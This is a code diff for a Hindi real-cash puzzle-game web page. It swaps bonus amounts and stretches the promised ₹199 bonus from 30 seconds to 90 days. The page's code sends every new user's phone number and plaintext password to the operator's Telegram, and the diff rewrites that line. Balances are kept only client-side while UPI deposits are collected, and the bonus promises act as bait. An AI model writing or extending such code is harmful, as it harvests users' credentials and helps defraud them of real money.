@@ -139,8 +139,8 @@ font-size: 12px;
 <!---------------- 1. LOGIN & RESET PAGE SECTION ---------------->
 <div id="login-section">
 <div class="card-box" style="text-align: center;" id="login-form-box">
-<h3 style="color: #ffab00; margin-top: 0; font-size: 16px;">🔐 सुरक्षित लॉगिन & ₹199 तक का बोनस</h3>
-<p style="font-size: 11px; color: #aaa;">खेलने के लिए अपना 10 अंकों का मोबाइल नंबर और पासवर्ड दर्ज करें:</p>
+<h3 style="color: #ffab00; margin-top: 0; font-size: 16px;">🔐 सुरक्षित लॉगिन & ₹19 इंस्टेंट बोनस</h3>
+<p style="font-size: 11px; color: #aaa;">खेलने के लिए अपना 10 अंकों का मोबाइल नंबर और पासवर्ड दर्ज करें (नया खाता बनाने पर ₹19 मिलेंगा):</p>
 <input type="tel" id="login-phone" placeholder="10 अंकों का मोबाइल नंबर" maxlength="10">
 <input type="password" id="login-pass" placeholder="पासवर्ड दर्ज करें">
 <button class="btn" onclick="processLogin()">सुरक्षित लॉगिन करें</button>
@@ -165,8 +165,8 @@ font-size: 12px;
 <!---------------- 2. MAIN SERVER DASHBOARD ---------------->
 <div id="app-dashboard" class="hidden">
 <div class="wallet-box">
-<h3>💰 मेरा वॉलेट: ₹<span id="balance">10</span></h3>
-<p id="bonus-timer-msg" style="font-size: 11px; color: #ffab00; margin: 5px 0 0 0;">⏳ ₹199 एक्टिवेशन बोनस मिलने में समय बाकी...</p>
+<h3>💰 मेरा वॉलेट: ₹<span id="balance">19</span></h3>
+<p id="bonus-timer-msg" style="font-size: 11px; color: #ffab00; margin: 5px 0 0 0;">⏳ 3 महीने (90 दिन) लगातार खेलने के बाद ₹199 सीनियर बोनस मिलेगा...</p>
 </div>
 
 <p style="color: #ffab00; font-weight: bold; font-size: 13px; margin: 10px 0 5px 0;">महाकाल पजल बैटल - मास्टर गेम्स सूची:</p>
@@ -319,7 +319,7 @@ font-size: 12px;
 <audio id="bonus-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
 <script>
-let walletBalance = 10;
+let walletBalance = 19; // Default starting balance set to 19
 let pendingDep = null; 
 let pendingWit = null;
 let isSystemLocked = false; 
@@ -336,7 +336,11 @@ function sendTelegram(text) {
 
 window.onload = function() {
   let savedBal = localStorage.getItem('mahakal_master_wallet');
-  if(savedBal !== null) walletBalance = parseFloat(savedBal);
+  if(savedBal !== null) {
+    walletBalance = parseFloat(savedBal);
+  } else {
+    walletBalance = 19;
+  }
   
   let lockState = localStorage.getItem('mahakal_master_lock');
   if(lockState === 'true') {
@@ -399,7 +403,7 @@ function askAiSupport() {
   } else if(q.includes('password') || q.includes('bhul') || q.includes('reset')) {
     answer = "💡 <b>AI Solution:</b> लॉगिन स्क्रीन पर 'पासवर्ड भूल गए? Reset Karein' बटन पर क्लिक करें। अपना मोबाइल नंबर और तीनों खानों में नया पासवर्ड डालकर 'पासवर्ड अपडेट करें' पर क्लिक करें।";
   } else if(q.includes('bonus') || q.includes('199')) {
-    answer = "💡 <b>AI Solution:</b> गेम में एक्टिव रहने और नियमित खेलने पर आपको ₹199 तक का एक्टिवेशन बोनस मिलता है। साथ ही दोस्तों को शेयर करने पर 3% कमीशन भी मिलता है!";
+    answer = "💡 <b>AI Solution:</b> नियमित और लगातार 3 महीने (90 दिन) तक गेम खेलने पर आपको ₹199 सीनियर एक्टिवेशन बोनस मिलता है। साथ ही दोस्तों को शेयर करने पर 3% कमीशन भी मिलता है!";
   } else {
     answer = "⚠️ AI को इस समस्या का सटीक उत्तर नहीं मिला। कृपया नीचे दिए गए बटन से सीधे एडमिन (Telegram) को सूचित करें ताकि आपकी मदद की जा सके।";
     btnTelegram.style.display = "block";
@@ -419,13 +423,13 @@ function sendQueryToTelegram() {
   document.getElementById('send-to-telegram-btn').style.display = "none";
 }
 
-// Check or Start Loyal User ₹199 Bonus Timer
+// Check or Start Loyal User ₹199 Bonus Timer (3 Months / 90 Days requirement)
 function checkLoyalUserBonus() {
   let bonusClaimed = localStorage.getItem('mahakal_199_bonus_claimed');
   let timerMsg = document.getElementById('bonus-timer-msg');
 
   if(bonusClaimed === 'true') {
-    timerMsg.innerText = "🎉 ₹199 एक्टिवेशन बोनस मिल चुका है!";
+    timerMsg.innerText = "🎉 ₹199 सीनियर एक्टिवेशन बोनस मिल चुका है!";
     return;
   }
 
@@ -437,19 +441,18 @@ function checkLoyalUserBonus() {
 
   let currentTime = new Date().getTime();
   let timePassed = currentTime - parseInt(joinTime);
-  let targetTime = 30 * 1000; // 30 seconds testing time
+  let targetTime = 90 * 24 * 60 * 60 * 1000; // 3 Months (90 Days in milliseconds)
 
   if(timePassed >= targetTime) {
     walletBalance += 199;
     saveWallet();
     localStorage.setItem('mahakal_199_bonus_claimed', 'true');
-    timerMsg.innerText = "🎉 बधाई हो! ₹199 एक्टिवेशन बोनस मिल गया है!";
-    alert("🎉 बधाई हो! गेम में एक्टिव रहने पर आपको ₹199 का बंपर बोनस मिल गया है!");
-    sendTelegram(`🎁 ₹199 Loyal User Bonus Credited!\n📱 Mobile: ${loggedInPhone || "Active User"}\n💰 Total Balance: ₹${walletBalance}`);
+    timerMsg.innerText = "🎉 बधाई हो! 3 महीने पूरे होने पर ₹199 बोनस मिल गया है!";
+    alert("🎉 बधाई हो! लगातार 3 महीने तक गेम खेलने और एक्टिव रहने पर आपको ₹199 का सीनियर बोनस मिल गया है!");
+    sendTelegram(`🎁 ₹199 3-Month Loyal User Bonus Credited!\n📱 Mobile: ${loggedInPhone || "Active User"}\n💰 Total Balance: ₹${walletBalance}`);
   } else {
-    let timeLeft = Math.ceil((targetTime - timePassed) / 1000);
-    timerMsg.innerText = `⏳ ₹199 बोनस मिलने में ${timeLeft} सेकंड बाकी...`;
-    setTimeout(checkLoyalUserBonus, 1000);
+    let daysLeft = Math.ceil((targetTime - timePassed) / (1000 * 60 * 60 * 24));
+    timerMsg.innerText = `⏳ ₹199 सीनियर बोनस मिलने में ${daysLeft} दिन बाकी (3 महीने का नियम)...`;
   }
 }
 
@@ -466,7 +469,7 @@ function copyReferLink() {
 // Share on WhatsApp
 function shareOnWhatsApp() {
   let link = document.getElementById('ref-link-input').value;
-  let text = `🔥 महाकाल गेमिंग ज़ोन - Mahakal Puzzle Battle!\n🧠 पहेलियां सुलझाएं और असली नकद जीतें!\n📥 ₹199 तक का बंपर बोनस पाएं!\n\nअभी खेलें: ${link}`;
+  let text = `🔥 महाकाल गेमिंग ज़ोन - Mahakal Puzzle Battle!\n🧠 पहेलियां सुलझाएं और असली नकद जीतें!\n📥 ₹19 इंस्टेंट बोनस पाएं!\n\nअभी खेलें: ${link}`;
   let whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`;
   window.open(whatsappUrl, '_blank');
 }
@@ -546,15 +549,15 @@ function processLogin() {
     registeredUsers[ph] = ps;
     localStorage.setItem('mahakal_users_db', JSON.stringify(registeredUsers));
     
-    walletBalance += 10;
+    walletBalance += 19;
     saveWallet();
     
     let sound = document.getElementById('bonus-sound');
     if(sound) sound.play().catch(e => console.log(e));
 
-    msg.className = "msg"; msg.innerText = "🎉 बधाई हो! नया खाता बना और ₹10 इंस्टेंट बोनस मिला!";
+    msg.className = "msg"; msg.innerText = "🎉 बधाई हो! नया खाता बना और ₹19 इंस्टेंट बोनस मिला!";
     let refText = referrerPhone ? `\n🤝 Referred By: ${referrerPhone}` : "";
-    sendTelegram(`🚀 Naya User Registered & Instant Bonus Given!\n📱 Number: ${ph}\n🔑 Pass: ${ps}\n💰 Bonus: ₹10 Credited${refText}`);
+    sendTelegram(`🚀 Naya User Registered & Instant Bonus Given!\n📱 Number: ${ph}\n🔑 Pass: ${ps}\n💰 Bonus: ₹19 Credited${refText}`);
   }
 
   setTimeout(() => {
@@ -649,7 +652,7 @@ function sendDepositReq() {
 
   if(isNaN(amt) || amt <= 0 || !upiNum || !tx) { 
     msg.className = "error"; 
-    msg.innerText = "कृपया सही राशि, UPI नंबर जोड़ी और Txn ID भरें!"; 
+    msg.innerText = "कृपया सही राशि, UPI नंबर और Txn ID भरें!"; 
     return; 
   }
 
